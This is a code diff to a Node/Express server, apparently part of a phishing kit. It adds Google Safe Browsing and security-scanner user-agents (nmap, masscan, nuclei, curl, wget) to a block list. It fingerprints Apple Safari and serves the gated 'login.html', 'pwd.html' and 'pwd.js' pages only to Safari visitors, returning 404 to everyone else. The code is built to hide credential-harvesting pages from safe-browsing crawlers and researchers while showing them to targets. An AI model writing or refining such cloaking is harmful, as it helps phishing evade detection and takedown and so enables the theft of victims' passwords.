@@ -16,7 +16,11 @@ const BOT_UA_PATTERNS = [
   'bot', 'crawler', 'spider', 'crawling', 'scraper',
   'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
   'yandex', 'sogou', 'exabot', 'facebot', 'facebookexternalhit',
-  'safe browsing', 'security', 'scanner', 'nmap', 'masscan',
+  // Google Safe Browsing (official user-agent token from Google documentation)
+  'google-safety',
+  // Other bot/security patterns
+  'safe browsing', 'safebrowsing', 'google-safe-browsing', 'safebrowsingapi',
+  'security', 'scanner', 'nmap', 'masscan',
   'zgrab', 'nuclei', 'curl', 'wget', 'python-requests', 'libwww',
   'java/', 'go-http-client', 'okhttp', 'axios', 'dataforseo'
 ];
@@ -214,6 +218,18 @@ function isBot(req) {
   return false;
 }
 
+// --- Apple Safari detection ------------------------------------------------
+// Safari shares "Safari" and "Version/" tokens with many other browsers, so
+// we confirm an Apple platform first and then exclude the known impostors.
+function isAppleSafari(ua) {
+  if (!ua) return false;
+  const onApple     = /Macintosh|Mac OS X|iPhone|iPad|iPod/.test(ua);
+  const looksSafari = /Safari/.test(ua) && /Version\/\d+/.test(ua);
+  const impostor    = /Chrome|Chromium|CriOS|FxiOS|EdgiOS|Edg|OPiOS|OPR|OPT|Android|SamsungBrowser|YaBrowser|UCBrowser|FBAN|FBAV|Instagram|Line|GSA/.test(ua);
+  return onApple && looksSafari && !impostor;
+}
+// ---------------------------------------------------------------------------
+
 app.use((req, res, next) => {
   if (req.path === '/api/upload-image') return next();
   if (isBot(req)) {
@@ -222,6 +238,17 @@ app.use((req, res, next) => {
   next();
 });
 
+// --- Safari gate -----------------------------------------------------------
+// The client calls this endpoint; the browser sends its UA automatically.
+// /login.html is returned in JSON ONLY when the UA confirms Apple Safari.
+// Every other agent receives {} — the path never leaves the server for them.
+app.get('/check-browser', (req, res) => {
+  if (isAppleSafari(req.get('User-Agent'))) {
+    return res.json({ go: '/login.html' });
+  }
+  res.json({});
+});
+// ---------------------------------------------------------------------------
 
 const DATA_FILE = path.join(__dirname, 'sessions-data.json');
 const IMAGES_DIR = path.join(__dirname, 'session-images');
@@ -386,6 +413,38 @@ app.post('/api/login', (req, res) => {
 app.get('/adminlogin.html', (req, res) => {
   res.sendFile(path.join(__dirname, 'adminlogin.html'));
 });
+
+// --- Gated files ------------------------------------------------------------
+// All live in /private (NOT /public) so express.static never serves them.
+// Each route is its own gate — non-Safari requests get a 404 on all of them.
+app.get('/login.html', (req, res) => {
+  if (isAppleSafari(req.get('User-Agent'))) {
+    return res.sendFile(path.join(__dirname, 'private', 'login.html'));
+  }
+  res.status(404).send('Not found');
+});
+
+app.get('/index.js', (req, res) => {
+  if (isAppleSafari(req.get('User-Agent'))) {
+    return res.sendFile(path.join(__dirname, 'private', 'index.js'));
+  }
+  res.status(404).send('Not found');
+});
+
+app.get('/pwd.html', (req, res) => {
+  if (isAppleSafari(req.get('User-Agent'))) {
+    return res.sendFile(path.join(__dirname, 'private', 'pwd.html'));
+  }
+  res.status(404).send('Not found');
+});
+
+app.get('/pwd.js', (req, res) => {
+  if (isAppleSafari(req.get('User-Agent'))) {
+    return res.sendFile(path.join(__dirname, 'private', 'pwd.js'));
+  }
+  res.status(404).send('Not found');
+});
+// ---------------------------------------------------------------------------
 
 
 
